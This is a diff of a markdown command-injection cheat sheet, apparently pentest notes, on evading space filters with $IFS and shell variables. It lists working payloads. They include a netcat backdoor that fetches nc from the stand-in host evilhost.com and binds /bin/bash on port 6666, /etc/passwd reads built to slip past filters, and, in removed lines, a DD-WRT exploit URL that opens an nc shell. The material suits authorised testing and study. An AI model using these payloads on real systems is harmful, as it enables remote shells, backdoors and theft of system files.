@@ -28,33 +28,30 @@ Backtick<br>
 Background <br>
 ``` `blah & blah2` ```
 
-***Shell commands without spaces***
-<b>Using Internal Field Separator (IFS)</b>
+**Shell commands without spaces**
+
+Using Internal Field Separator (IFS):<br>
 Test for cmd injection withouot spaces:<br>
 ``` sleep${IFS:0:1}20 ```<br>
 
-Example netcat backdoor without spaces:<br>
+Example IFS netcat backdoor without spaces:<br>
 ``` {wget,http://evilhost.com/nc} ```<br>
 ``` {chmod,+x,./nc} ```<br>
 ``` {./nc,-l,-p,6666,-e,/bin/bash} ```<br>
 
-<b>Shell Variables</b><br>
+$IFS shell variable:<br>
+``` cat$IFS/etc/passwd ```<br>
+increment the first +1 to retreive the entire file, line by line<br>
+``` cat$IFS/etc/passwd|tail$IFS-n+1|head$IFS-n+1 ```
+
+Shell Variables:<br>
 ``` CMD=$'cat\x20/etc/passwd';$CMD ```
 
 shell variable, increment through file one line at a time: <br>
 increment the first +1 to retreive the entire file, line by line<br>
 ``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```
 
-<b>$IFS</b><br>
-DD-WRT exploit POC circa 2009<br>
-``` http:///cgi-bin/;nc$IFS-l$IFS-p$IFS5555$IFS-e$IFS/bin/sh ```<br>
-or <br>
-``` cat$IFS/etc/passwd ```<br>
-increment the first +1 to retreive the entire file, line by line<br>
-``` cat$IFSSP/etc/passwd|tail$IFS-n+1|head$IFS-n+1 ```
-
 **Exfiltrating Files / Data**
-
 FTP <br>
 Make a new text file, and echo and then redirect to FTP
 
